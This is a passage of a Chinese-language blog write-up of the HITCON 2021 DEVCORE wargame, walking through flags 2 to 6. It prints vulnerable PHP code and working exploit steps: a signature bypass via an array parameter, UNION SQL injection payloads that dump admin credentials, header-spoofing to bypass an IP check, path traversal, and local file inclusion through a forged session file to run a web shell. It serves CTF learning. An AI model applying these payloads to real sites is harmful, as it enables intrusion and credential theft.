</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;error_msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;找不到此訂單&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;error.php&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$sig_hash <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_sig_hash</span>($sig);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($sig_hash <span style=color:#f92672>&amp;&amp;</span> $sig_hash <span style=color:#f92672>!=</span> $order[<span style=color:#e6db74>&#39;sig_hash&#39;</span>]) {
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;error_msg&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;訂單網址參數錯誤&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;error.php&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span> ($order[<span style=color:#e6db74>&#39;status&#39;</span>]) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_PICKING</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_PACKING</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_SENDING</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_DELIVERING</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_ARRIVED</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#a6e22e>ORDER_STATUS_FINISH</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># include.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_sig_hash</span>($data) {
</span></span><span style=display:flex><span>    $pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
</span></span><span style=display:flex><span>    $res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;SELECT `value` FROM options WHERE `key` = &#39;sig_secret&#39; LIMIT 1&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
</span></span><span style=display:flex><span>    $row <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$row) {
</span></span><span style=display:flex><span>        $secret <span style=color:#f92672>=</span> <span style=color:#a6e22e>random_str</span>(<span style=color:#ae81ff>64</span>);
</span></span><span style=display:flex><span>        $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;INSERT INTO options VALUES (&#39;sig_secret&#39;, &#39;&#34;</span><span style=color:#f92672>.</span>$secret<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&#39;), (&#39;sig_algorithm&#39;, &#39;sha256&#39;)&#34;</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $secret <span style=color:#f92672>=</span> $row[<span style=color:#e6db74>&#39;value&#39;</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;SELECT `value` FROM options WHERE `key` = &#39;sig_algorithm&#39; LIMIT 1&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
</span></span><span style=display:flex><span>    $algo <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>()[<span style=color:#e6db74>&#39;value&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>hash_hmac</span>($algo, $data, $secret);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如果將 <code>sig</code> 以陣列的方式傳入 <code>if ($sig_hash && $sig_hash != $order['sig_hash'])</code> 結果會變成 <code>if (NULL && NULL != "abc")</code> 恆為 False。</p><p>所以只要將 <code>sig=</code> 改為 <code>sig[]=</code> 就可以任意讀取訂單內容。</p><p>在網址輸入 <code>http://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=</code> 即可獲得第二個 flag。</p><p><img alt=sig loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sig.png></p><h2 id=flag-3>Flag 3<a hidden class=anchor aria-hidden=true href=#flag-3>#</a></h2><p>在 <code>print.php</code> 可以發現裡面有一個可以 SQL injection 的注入點。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;third_party/vendor/autoload.php&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//require_once(&#39;rate_limit.php&#39;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>// rate limit is not working, use random sleep as a workaround
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>sleep</span>(<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$is_from_print <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;id&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
</span></span><span style=display:flex><span>$sig <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_get_param</span>(<span style=color:#e6db74>&#39;sig&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
</span></span><span style=display:flex><span>$sig_hash <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_sig_hash</span>($sig);
</span></span><span style=display:flex><span>$pdo <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_pdo</span>();
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>(<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    SELECT *
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    FROM orders 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    WHERE sig_hash = &#39;</span><span style=color:#e6db74>$sig_hash</span><span style=color:#e6db74>&#39; AND id = </span><span style=color:#e6db74>$id</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    LIMIT 1
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>PDO</span><span style=color:#f92672>::</span><span style=color:#a6e22e>FETCH_ASSOC</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    $order <span style=color:#f92672>=</span> $res<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>Error</span> $e) {
</span></span><span style=display:flex><span>    $order <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ob_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;pdf.php&#39;</span>);
</span></span><span style=display:flex><span>$html <span style=color:#f92672>=</span> <span style=color:#a6e22e>ob_get_clean</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$mpdf <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>\Mpdf\Mpdf</span>([
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;tempDir&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;/tmp&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;autoScriptToLang&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;autoLangToFont&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;mode&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;utf-8&#39;</span>
</span></span><span style=display:flex><span>]);
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetTitle</span>(<span style=color:#e6db74>&#39;收據明細&#39;</span>);
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetSubject</span>(<span style=color:#e6db74>&#39;收據明細&#39;</span>);
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetAuthor</span>(<span style=color:#a6e22e>random_str</span>((<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>256</span>))));
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>SetCreator</span>(<span style=color:#a6e22e>random_str</span>((<span style=color:#a6e22e>random_int</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>256</span>))));
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>WriteHTML</span>($html);
</span></span><span style=display:flex><span>$mpdf<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>Output</span>();
</span></span></code></pre></div><p>先在 <code>id</code> 中注入 <code>-1 or 1=1 -- </code>測試弱點是否成立。</p><p>可以成功找到第一筆訂單。</p><p><img alt=sqli_1 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_1.png></p><p>並使用 <code>UNION</code> 看看有哪幾個欄位可以被利用。</p><p>插入 <code>-1 UNION SELECT 1,2,3,4,5,6,7,8,9 --</code></p><p><img alt=sqli_2 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_2.png></p><p>而在 <code>/usr/share/nginx/b8ck3nd/login.php</code> 裡面可以找到儲存後台帳號密碼的資料表名稱 <code>backend_users</code></p><p>並利用 SQL injection 找出 <code>backend_users</code> 有哪些欄位。</p><p>插入 <code>-1 UNION SELECT GROUP_CONCAT(column_name SEPARATOR ','),2,3,4,5,6,7,8,9 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name='backend_users' -- </code>後得到 <code>id,username,password,description</code></p><p><img alt=sqli_3 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_3.png></p><p>得到欄位後，即可取得後台帳號密碼。
<code>-1 UNION SELECT username,password,description,4,5,6,7,8,9 FROM backend_users --</code></p><p>並可以在 Description 中取得第三個 flag。</p><p><img alt=sqli_4 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sqli_4.png></p><h2 id=flag-4>Flag 4<a hidden class=anchor aria-hidden=true href=#flag-4>#</a></h2><p>在嘗試進入後台頁面 <code>http://web.ctf.devcore.tw/b8ck3nd/</code> 時，會被 redirect 回首頁。</p><p><img alt=redirect loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/redirect.png></p><p>利用 path traversal 查看 <code>/usr/share/nginx/b8ck3nd/include.php</code>，發現後台的頁面會驗證來源 IP，若來源 IP 不是 <code>127.0.0.1</code> 或 <code>172.18.11.89</code>，則會 redirect 回首頁。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;../frontend/include.php&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start_once</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>(<span style=color:#a6e22e>get_client_ip</span>(), [<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#e6db74>&#39;172.18.11.89&#39;</span>], <span style=color:#66d9ef>true</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user_id&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>endsWith</span>($_SERVER[<span style=color:#e6db74>&#39;SCRIPT_FILENAME&#39;</span>], <span style=color:#e6db74>&#39;login.php&#39;</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /b8ck3nd/login.php&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># ../frontend/include.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get_client_ip</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_CLIENT_IP&#39;</span>])) {
</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_CLIENT_IP&#39;</span>];
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $ip <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $ip;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>但可以發現驗證 IP 來源是參考 HTTP header 的內容，只要在 header 中加入 <code>CLIENT-IP</code>、<code>X-FORWARDED-FOR</code>、<code>REMOTE-ADDR</code> 即可繞過其限制。詳細可以參考 <a href=https://devco.re/blog/2014/06/19/client-ip-detection/>如何正確的取得使用者 IP？ | DEVCORE 戴夫寇爾</a></p><p><img alt=client_ip loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/client_ip.png></p><p>並且可以使用剛剛 SQL injection 取得的帳號密碼 <code>admin/u=479_p5jV:Fsq(2</code> 進行登入。</p><p>登入後即可取得第四個 flag。</p><p><img alt=flag_4 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_4.png></p><h2 id=flag-5>Flag 5<a hidden class=anchor aria-hidden=true href=#flag-5>#</a></h2><p>在上傳的功能中可以發現如果在 POST 封包中，若有參數 <code>rename</code> 、 <code>folder</code> 即可控制上傳檔案的檔案名稱以及路徑，並且未有任何限制。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;include.php&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;GET&#39;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: text/plain&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/json; charset=utf-8&#39;</span>);
</span></span><span style=display:flex><span>    $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>pathinfo</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>], <span style=color:#a6e22e>PATHINFO_EXTENSION</span>);
</span></span><span style=display:flex><span>    $filename <span style=color:#f92672>=</span> <span style=color:#a6e22e>random_str</span>(<span style=color:#ae81ff>32</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>.</span>$ext;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;rename&#39;</span>])) {
</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;rename&#39;</span>];
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;folder&#39;</span>])) {
</span></span><span style=display:flex><span>        $folder <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;folder&#39;</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>(<span style=color:#a6e22e>IMAGE_PATH</span><span style=color:#f92672>.</span>$folder)) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>mkdir</span>(<span style=color:#a6e22e>IMAGE_PATH</span><span style=color:#f92672>.</span>$folder);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> $folder<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span>$filename;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $filepath <span style=color:#f92672>=</span> <span style=color:#a6e22e>IMAGE_PATH</span> <span style=color:#f92672>.</span> $filename;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], $filepath);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;rsync_wrap &#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>escapeshellarg</span>($filepath));
</span></span><span style=display:flex><span>    $id <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_urlsafe_encode</span>($filename);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>json_encode</span>([
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;default&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;/image.php?id=&#39;</span><span style=color:#f92672>.</span>$id
</span></span><span style=display:flex><span>    ]);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>http_response_code</span>(<span style=color:#ae81ff>400</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>只要在 <code>folder</code> 中含有 <code>/../</code> 即可出現第五個 flag。</p><p><img alt=flag_5 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_5.png></p><h2 id=flag-6>Flag 6<a hidden class=anchor aria-hidden=true href=#flag-6>#</a></h2><p>最後一個 flag 要想辦法上傳 shell，但因 nginx 可以瀏覽的路徑都是 mount 成 ro 無法直接上傳 web shell。</p><pre tabindex=0><code># /proc/mounts
/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
</code></pre><p>可以在 <code>/usr/share/nginx/frontend/include.php</code> 裡面發現一段語系切換的功能。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># frontend/include.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>])) {
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>DEFAULT_LANGUAGE</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span>(<span style=color:#e6db74>&#39;langs/&#39;</span> <span style=color:#f92672>.</span> $_SESSION[<span style=color:#e6db74>&#39;lang&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;.php&#39;</span>);
</span></span></code></pre></div><p>這裡會將 session 中的 <code>lang</code> 值當成語系檔案引入進來，且並未做任何驗證，只要在 <code>lang</code> 中填入任意路徑即可達成 local file inclusion 弱點，執行 web shell。</p><p>先在 <code>/usr/share/nginx/images/</code> 中上傳我們要被引入的 web shell。</p><p><img alt=web_shell loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/web_shell.png></p><p>PHP 的 session 值會存在於 <code>/tmp/sess_&lt;session_id></code>。
所以只要上傳 <code>lang|s:18:"../../images/shell";</code> 至 <code>/tmp/sess_&lt;session_id></code>，就可以將 session 中的 <code>lang</code> 值更改成 <code>../../images/shell</code>，進而執行 web shell。</p><p><img alt=sess loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/sess.png></p><p><img alt=get_shell loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/get_shell.png></p><p>根目錄裡有一個 <code>/readflag</code> 執行後即可得到第六個 flag。</p><p><img alt=readflag loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/readflag.png></p><p><img alt=flag_6 loading=lazy src=/img/posts/security/hitcon-2021-devcore-wargame-writeup/flag_6.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.garytan.tw/tags/security/>Security</a></li><li><a href=https://blog.garytan.tw/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://blog.garytan.tw/posts/security/how-should-organization-evaluate-which-data-soc-needs-to-collect/><span class=title>« Prev</span><br><span>企業該如何評估 SOC 需要收容哪種資料</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on x" href="https://x.com/intent/tweet/?text=HITCON%202021%20DEVCORE%20Wargame%20Writeup&amp;url=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f&amp;hashtags=security%2cwriteup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f&amp;title=HITCON%202021%20DEVCORE%20Wargame%20Writeup&amp;summary=HITCON%202021%20DEVCORE%20Wargame%20Writeup&amp;source=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share HITCON 2021 DEVCORE Wargame Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fblog.garytan.tw%2fposts%2fsecurity%2fhitcon-2021-devcore-wargame-writeup%2f&title=HITCON%202021%20DEVCORE%20Wargame%20Writeup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path 